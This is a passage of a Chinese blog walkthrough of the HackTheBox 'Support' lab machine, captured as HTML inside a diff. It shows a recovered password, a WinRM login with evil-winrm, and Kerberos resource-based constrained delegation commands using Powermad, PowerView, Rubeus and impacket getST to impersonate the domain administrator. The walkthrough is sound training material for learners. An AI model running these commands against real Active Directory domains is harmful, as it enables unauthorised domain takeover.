+</span></span><span class="line"><span class="cl">name: wilson.shelby
+</span></span><span class="line"><span class="cl">name: anderson.damian
+</span></span><span class="line"><span class="cl">name: thomas.raphael
+</span></span><span class="line"><span class="cl">name: levine.leopoldo
+</span></span><span class="line"><span class="cl">name: raven.clifton
+</span></span><span class="line"><span class="cl">name: bardot.mary
+</span></span><span class="line"><span class="cl">name: cromwell.gerard
+</span></span><span class="line"><span class="cl">name: monroe.david
+</span></span><span class="line"><span class="cl">name: west.laura
+</span></span><span class="line"><span class="cl">name: langley.lucy
+</span></span><span class="line"><span class="cl">name: daughtler.mabel
+</span></span><span class="line"><span class="cl">name: stoll.rachelle
+</span></span><span class="line"><span class="cl">name: ford.victoria
+</span></span><span class="line"><span class="cl">name: Administrator
+</span></span><span class="line"><span class="cl">name: Guest
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ol start="2">
+<li>发现在<code>name=support</code>时会多出一个<code>info</code>项</li>
+</ol>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/6f8fd6d890e5cd270fbb250fd885eb4f.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/6f8fd6d890e5cd270fbb250fd885eb4f.png, https://img.mi3aka.eu.org/2022/08/6f8fd6d890e5cd270fbb250fd885eb4f.png 1.5x, https://img.mi3aka.eu.org/2022/08/6f8fd6d890e5cd270fbb250fd885eb4f.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/6f8fd6d890e5cd270fbb250fd885eb4f.png"
+        title="https://img.mi3aka.eu.org/2022/08/6f8fd6d890e5cd270fbb250fd885eb4f.png" /></p>
+<p><code>Ironside47pleasure40Watchful</code></p>
+<ol start="3">
+<li>goby显示<code>5985</code>端口上存在<code>http</code>服务,推测为winrm,尝试进行攻击</li>
+</ol>
+<p>一开始用<code>pywinrm</code>去调用发现抛出<code>winrm.exceptions.InvalidCredentialsError</code>错误&hellip;</p>
+<p>用<a href="https://github.com/Hackplayers/evil-winrm" target="_blank" rel="noopener noreffer ">https://github.com/Hackplayers/evil-winrm</a>进行攻击</p>
+<blockquote>
+<p>建议用Docker版</p>
+</blockquote>
+<p><code>./evil-winrm.rb -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/37fec9d0cc5a845dff52b2c6f7f2eb1c.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/37fec9d0cc5a845dff52b2c6f7f2eb1c.png, https://img.mi3aka.eu.org/2022/08/37fec9d0cc5a845dff52b2c6f7f2eb1c.png 1.5x, https://img.mi3aka.eu.org/2022/08/37fec9d0cc5a845dff52b2c6f7f2eb1c.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/37fec9d0cc5a845dff52b2c6f7f2eb1c.png"
+        title="https://img.mi3aka.eu.org/2022/08/37fec9d0cc5a845dff52b2c6f7f2eb1c.png" /></p>
+<p>CS上个线</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png, https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png 1.5x, https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png"
+        title="https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png" /></p>
+<p><del>提权暂时没有思路&hellip;</del></p>
+<h2 id="获取root权限">获取root权限</h2>
+<blockquote>
+<p>Kerberos委派攻击</p>
+</blockquote>
+<p><a href="https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution" target="_blank" rel="noopener noreffer ">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution</a></p>
+<p><a href="https://xz.aliyun.com/t/7217" target="_blank" rel="noopener noreffer ">https://xz.aliyun.com/t/7217</a></p>
+<blockquote>
+<p>如果您对该计算机的 AD 对象具有 WRITE 权限，则可以在远程计算机上以提升的权限获得代码执行。</p>
+</blockquote>
+<p>域控制器名称<code>dc.support.htb</code></p>
+<p>加载<code>PowerView.ps1</code>,在<code>LSTAR/scripts/InfoCollect</code>里面</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/2810528b74bd2a250bcbae6e9583a850.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/2810528b74bd2a250bcbae6e9583a850.png, https://img.mi3aka.eu.org/2022/08/2810528b74bd2a250bcbae6e9583a850.png 1.5x, https://img.mi3aka.eu.org/2022/08/2810528b74bd2a250bcbae6e9583a850.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/2810528b74bd2a250bcbae6e9583a850.png"
+        title="https://img.mi3aka.eu.org/2022/08/2810528b74bd2a250bcbae6e9583a850.png" /></p>
+<p>加载<a href="https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1" target="_blank" rel="noopener noreffer ">Powermad.ps1</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString &#39;123456&#39; -AsPlainText -Force) -Verbose
+</span></span><span class="line"><span class="cl">Get-DomainComputer FAKE01
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/06bd34f8941418ffb2ce065d0b8cc1d8.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/06bd34f8941418ffb2ce065d0b8cc1d8.png, https://img.mi3aka.eu.org/2022/08/06bd34f8941418ffb2ce065d0b8cc1d8.png 1.5x, https://img.mi3aka.eu.org/2022/08/06bd34f8941418ffb2ce065d0b8cc1d8.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/06bd34f8941418ffb2ce065d0b8cc1d8.png"
+        title="https://img.mi3aka.eu.org/2022/08/06bd34f8941418ffb2ce065d0b8cc1d8.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)&#34;
+</span></span><span class="line"><span class="cl">$SDBytes = New-Object byte[] ($SD.BinaryLength)
+</span></span><span class="line"><span class="cl">$SD.GetBinaryForm($SDBytes, 0)
+</span></span><span class="line"><span class="cl">Get-DomainComputer DC | Set-DomainObject -Set @{&#39;msds-allowedtoactonbehalfofotheridentity&#39;=$SDBytes} -Verbose
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/c524ea6b3abd879413cce448b39e7b60.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/c524ea6b3abd879413cce448b39e7b60.png, https://img.mi3aka.eu.org/2022/08/c524ea6b3abd879413cce448b39e7b60.png 1.5x, https://img.mi3aka.eu.org/2022/08/c524ea6b3abd879413cce448b39e7b60.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/c524ea6b3abd879413cce448b39e7b60.png"
+        title="https://img.mi3aka.eu.org/2022/08/c524ea6b3abd879413cce448b39e7b60.png" /></p>
+<p>从<a href="https://github.com/r3motecontrol/Ghostpack-CompiledBinaries" target="_blank" rel="noopener noreffer ">https://github.com/r3motecontrol/Ghostpack-CompiledBinaries</a>获取<code>Rubeus.exe</code></p>
+<p><code>.\Rubeus.exe hash /password:123456 /user:FAKE01 /domain:offense.local</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">[*] Input password             : 123456
+</span></span><span class="line"><span class="cl">[*] Input username             : FAKE01
+</span></span><span class="line"><span class="cl">[*] Input domain               : offense.local
+</span></span><span class="line"><span class="cl">[*] Salt                       : OFFENSE.LOCALFAKE01
+</span></span><span class="line"><span class="cl">[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
+</span></span><span class="line"><span class="cl">[*]       aes128_cts_hmac_sha1 : 3D33480EFAE7A9D3CEFCF2809D6B1721
+</span></span><span class="line"><span class="cl">[*]       aes256_cts_hmac_sha1 : C3178E04A2D3587512B72838F32FABC7735FE78B7AC0CCC3787E78F614024451
+</span></span><span class="line"><span class="cl">[*]       des_cbc_md5          : FDF1D320C28C750E
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/bfc6c6ff7e845e946b12b0c74118ab24.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/bfc6c6ff7e845e946b12b0c74118ab24.png, https://img.mi3aka.eu.org/2022/08/bfc6c6ff7e845e946b12b0c74118ab24.png 1.5x, https://img.mi3aka.eu.org/2022/08/bfc6c6ff7e845e946b12b0c74118ab24.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/bfc6c6ff7e845e946b12b0c74118ab24.png"
+        title="https://img.mi3aka.eu.org/2022/08/bfc6c6ff7e845e946b12b0c74118ab24.png" /></p>
+<p>但是在<code>.\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/dc.offense.local /ptt</code>这一步卡住了&hellip;</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/8dfb3a35487783337987e17609a82c86.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/8dfb3a35487783337987e17609a82c86.png, https://img.mi3aka.eu.org/2022/08/8dfb3a35487783337987e17609a82c86.png 1.5x, https://img.mi3aka.eu.org/2022/08/8dfb3a35487783337987e17609a82c86.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/8dfb3a35487783337987e17609a82c86.png"
+        title="https://img.mi3aka.eu.org/2022/08/8dfb3a35487783337987e17609a82c86.png" /></p>
+<hr>
+<p>用<a href="https://github.com/SecureAuthCorp/impacket/tree/master/examples" target="_blank" rel="noopener noreffer ">impacket/examples</a>中的<code>getST.py</code></p>
+<p><code>python3 getST.py support.htb/FAKE01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/006be78d9ec0dfd0eac39a8a28f91f62.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/006be78d9ec0dfd0eac39a8a28f91f62.png, https://img.mi3aka.eu.org/2022/08/006be78d9ec0dfd0eac39a8a28f91f62.png 1.5x, https://img.mi3aka.eu.org/2022/08/006be78d9ec0dfd0eac39a8a28f91f62.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/006be78d9ec0dfd0eac39a8a28f91f62.png"
+        title="https://img.mi3aka.eu.org/2022/08/006be78d9ec0dfd0eac39a8a28f91f62.png" /></p>
+<p><a href="https://xz.aliyun.com/t/8665#toc-5" target="_blank" rel="noopener noreffer ">https://xz.aliyun.com/t/8665#toc-5</a></p>
+<p>使用获取到的<code>ccache</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/8870bc274dd45bafef3a57fac53d6687.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/8870bc274dd45bafef3a57fac53d6687.png, https://img.mi3aka.eu.org/2022/08/8870bc274dd45bafef3a57fac53d6687.png 1.5x, https://img.mi3aka.eu.org/2022/08/8870bc274dd45bafef3a57fac53d6687.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/8870bc274dd45bafef3a57fac53d6687.png"
+        title="https://img.mi3aka.eu.org/2022/08/8870bc274dd45bafef3a57fac53d6687.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2022/08/4b85f95f473dbcd842aac660ee68abb6.png"
+        data-srcset="https://img.mi3aka.eu.org/2022/08/4b85f95f473dbcd842aac660ee68abb6.png, https://img.mi3aka.eu.org/2022/08/4b85f95f473dbcd842aac660ee68abb6.png 1.5x, https://img.mi3aka.eu.org/2022/08/4b85f95f473dbcd842aac660ee68abb6.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2022/08/4b85f95f473dbcd842aac660ee68abb6.png"
+        title="https://img.mi3aka.eu.org/2022/08/4b85f95f473dbcd842aac660ee68abb6.png" /></p>
+<hr>
+<blockquote>
+<p>捋下思路</p>
+</blockquote>
+<ol>
+<li>
+<p>通过nmap和goby发现开放<code>445</code>和<code>5985</code>端口</p>
+</li>
+<li>
+<p>通过smbclient读取到一个压缩包,对其中的<code>userinfo.exe</code>进行逆向,得到一个ldap的密码</p>
+</li>
+<li>
+<p>利用该密码进行<code>ldapsearch</code>,列出<code>CN=Users,DC=support,DC=htb</code>并进行分析,在<code>name=support</code>时得到一个<code>info</code></p>
+</li>
+<li>
+<p>利用得到的<code>info</code>作为密码成功登入<code>winrm</code></p>
+</li>
+<li>
+<p>进行约束委派,在域中创建一个新的对象,并更新属性<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>,使其能够冒充域用户(包括管理员)</p>
+</li>
+<li>
+<p>用<code>impacket</code>系列的<code>getST</code>请求<code>administrator</code>的<code>TGT</code>得到<code>administrator.ccache</code>,并利用该<code>ccache</code>冒充管理员成功利用<code>wimexec</code>登录系统</p>
+</li>
+</ol>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-08-29</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/htb-opensource/" class="prev" rel="prev" title="HackTheBox-OpenSource"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox-OpenSource</a>
+            <a href="/htb-redpanda/" class="next" rel="next" title="HackTheBox-RedPanda">HackTheBox-RedPanda<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
